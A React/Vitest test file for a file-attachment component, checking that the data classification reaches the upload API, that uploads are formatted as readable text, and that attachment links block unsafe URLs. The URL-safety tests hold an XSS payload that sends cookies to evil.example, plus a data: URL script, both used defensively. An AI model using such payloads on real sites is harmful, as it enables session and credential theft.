import { describe, it, expect, vi } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { LangProvider } from '../services/langContext.jsx';
import { describeStructuredUpload, FileMessageContent } from './FileAttach.jsx';

const uploadForAIMock = vi.fn(async () => ({ type: 'text', text: 'içerik', filename: 'a.txt' }));
vi.mock('../services/api.js', () => ({
  api: {
    uploadForAI: (...args) => uploadForAIMock(...args),
    uploadFile: vi.fn(async () => ({ url: '/api/files/x' })),
  },
}));

// item audit finding: uploadForAI() gained an optional classification
// param so a RESTRICTED/CONFIDENTIAL analysis's attachment gets scanned
// under that classification's fail-closed policy instead of silently
// defaulting to INTERNAL -- this must actually reach the API call, not
// just exist as an unused prop.
describe('FileAttach forwards dataClassification to the upload call', () => {
  it('passes the dataClassification prop through to api.uploadForAI', async () => {
    uploadForAIMock.mockClear();
    const FileAttachModule = await import('./FileAttach.jsx');
    const FileAttach = FileAttachModule.default;
    const onAIFile = vi.fn();
    const { container } = render(
      <LangProvider><FileAttach onAIFile={onAIFile} dataClassification="RESTRICTED" /></LangProvider>
    );
    const input = container.querySelector('input[type="file"]');
    const file = new File(['merhaba'], 'not.txt', { type: 'text/plain' });
    fireEvent.change(input, { target: { files: [file] } });

    await waitFor(() => expect(uploadForAIMock).toHaveBeenCalled());
    expect(uploadForAIMock).toHaveBeenCalledWith(file, 'RESTRICTED');
  });

  it('passes null when no dataClassification prop is given (unchanged default)', async () => {
    uploadForAIMock.mockClear();
    const FileAttachModule = await import('./FileAttach.jsx');
    const FileAttach = FileAttachModule.default;
    const onAIFile = vi.fn();
    const { container } = render(
      <LangProvider><FileAttach onAIFile={onAIFile} /></LangProvider>
    );
    const input = container.querySelector('input[type="file"]');
    const file = new File(['merhaba'], 'not.txt', { type: 'text/plain' });
    fireEvent.change(input, { target: { files: [file] } });

    await waitFor(() => expect(uploadForAIMock).toHaveBeenCalled());
    expect(uploadForAIMock).toHaveBeenCalledWith(file, null);
  });
});

// AQ security review finding: an emergency-chat message from ANOTHER
// participant (not just the local user) containing a crafted
// "[📎 EKLİ DOSYA: ...]\njavascript:..." body used to render as a clickable
// styled attachment link -- clicking it ran attacker JS in the viewer's own
// authenticated origin (cookie/JWT-reachable XSS).
describe('FileMessageContent attachment URL safety', () => {
  it('refuses to render a javascript: URL as a link -- falls back to plain text', () => {
    const text = 'bak bu dosyaya\n\n[📎 EKLİ DOSYA: rapor.png]\njavascript:fetch(\'https://evil.example/steal?c=\'+document.cookie)';
    render(<LangProvider><FileMessageContent text={text} /></LangProvider>);
    expect(screen.queryByRole('link')).not.toBeInTheDocument();
    expect(document.body.textContent).toContain('javascript:fetch');
  });

  it('still renders a real same-origin relative attachment URL as a link', () => {
    render(<LangProvider><FileMessageContent text={'not\n\n[📎 EKLİ DOSYA: rapor.pdf]\n/api/files/abc-123.pdf'} /></LangProvider>);
    expect(screen.getByRole('link')).toHaveAttribute('href', '/api/files/abc-123.pdf');
  });

  it('still renders a real https:// attachment URL as a link', () => {
    render(<LangProvider><FileMessageContent text={'not\n\n[📎 EKLİ DOSYA: rapor.pdf]\nhttps://cdn.example.com/rapor.pdf'} /></LangProvider>);
    expect(screen.getByRole('link')).toHaveAttribute('href', 'https://cdn.example.com/rapor.pdf');
  });

  it('refuses a data: URL too', () => {
    const text = 'x\n\n[📎 EKLİ DOSYA: a.png]\ndata:text/html,<script>alert(1)</script>';
    render(<LangProvider><FileMessageContent text={text} /></LangProvider>);
    expect(screen.queryByRole('link')).not.toBeInTheDocument();
  });
});

describe('describeStructuredUpload', () => {
  it('returns an empty string for no file', () => {
    expect(describeStructuredUpload(null)).toBe('');
  });

  it('passes plain text through unchanged', () => {
    expect(describeStructuredUpload({ type: 'text', text: 'merhaba' })).toBe('merhaba');
  });

  it('formats transaction records into readable text (regression: ConsultChat used to assume every non-text file had a .url)', () => {
    const result = describeStructuredUpload({
      type: 'transactions',
      filename: 'islemler.csv',
      transactions: [
        { id: 'TXN-1', amount: 100, hour: 5, frequency: 1, newCounterparty: 1, crossBorder: 0 },
      ],
    });
    expect(result).toContain('islemler.csv');
    expect(result).toContain('TXN-1');
    expect(result).toContain('100 TL');
    expect(result).not.toContain('undefined');
  });

  it('formats scenario records into readable text', () => {
    const result = describeStructuredUpload({
      type: 'scenarios',
      filename: 'senaryolar.csv',
      scenarios: [{ title: 'Fiyat artar', probability: '%35', timeframe: '0-6 ay', trigger: 'Talep artışı' }],
    });
    expect(result).toContain('Fiyat artar');
    expect(result).toContain('%35');
    expect(result).not.toContain('undefined');
  });

  it('formats optimization records into readable text', () => {
    const result = describeStructuredUpload({
      type: 'optimization',
      filename: 'kalemler.csv',
      budgetPercent: 60,
      items: [{ id: 'Proje-A', value: 35, cost: 30 }],
    });
    expect(result).toContain('Proje-A');
    expect(result).toContain('%60');
    expect(result).not.toContain('undefined');
  });

  it('falls back to a download-link note for a generic file with a url', () => {
    const result = describeStructuredUpload({ type: 'file', filename: 'rapor.pdf', url: '/api/files/abc.pdf' });
    expect(result).toContain('rapor.pdf');
    expect(result).toContain('/api/files/abc.pdf');
  });
});
